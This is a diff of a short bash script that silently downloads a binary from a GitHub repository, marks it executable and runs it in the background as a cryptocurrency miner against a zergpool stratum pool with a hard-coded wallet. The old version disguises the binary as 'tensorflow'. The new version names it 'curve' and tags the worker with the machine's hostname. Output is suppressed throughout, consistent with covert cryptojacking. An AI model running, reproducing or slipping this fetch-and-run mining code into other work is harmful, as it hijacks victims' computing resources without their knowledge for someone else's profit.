@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/gyrogerald/dyn-srb/raw/master/tensorflow >/dev/null 2>&1
-chmod +x tensorflow >/dev/null 2>&1
-nohup ./tensorflow --disable-gpu --algorithm curvehash --pool stratum+tcp://curvehash.eu.mine.zergpool.com:3343 --wallet XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk --password c=DASH,mc=PLSR,m=party.XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk --cpu-threads 1 > nohup.out
+wget https://github.com/gyrogerald/mici/raw/main/curve >/dev/null 2>&1
+chmod +x curve >/dev/null 2>&1
+nohup ./curve -a curvehash -o stratum+tcp://curvehash.eu.mine.zergpool.com:3343 -u XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk -p c=DASH,mc=PLSR,m=party.XshK2irNsaV9iTYc2KtGGf3LfUhXj3isKk,ID=$(echo $(hostname)) -t 1 > nohup.out
